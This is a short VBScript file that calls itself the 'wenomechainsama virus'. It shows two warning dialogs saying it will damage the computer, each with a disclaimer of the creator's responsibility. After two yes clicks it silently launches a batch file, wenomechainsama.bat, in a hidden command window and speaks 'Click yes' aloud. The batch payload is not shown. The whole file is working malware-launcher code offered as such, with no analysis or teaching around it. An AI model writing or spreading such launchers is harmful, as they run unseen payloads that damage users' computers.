X=MsgBox("WARNING the file u have just executed considers as a virus, this file is was made for educational purposes only, the file u have just executed will damage your pc, if u know what ur doing press yes below by clicking yes u accept all the next terms of service you agree that you are the only one that responsible for the damage done is only you, if u don't know what u have just executed simply close this window and nothing will happend. THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE",4 +48,"wenomechainsama virus")
if x=6 then
X=MsgBox("LAST WARNING this virus is not a joke, Are u sure u want to execute this file, as always THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE DONE",4 +48,"wenomechainsama virus")
elseif x=7 then
end if
if x=6 then
Set oShell = CreateObject ("Wscript.Shell")
Dim strArgs
strArgs = "cmd /c wenomechainsama.bat"
oShell.Run strArgs, 0, false
Dim message, sapi 
message="Click yes"
Set sapi=CreateObject("sapi.spvoice")
sapi.Speak message
elseif x=7 then
end if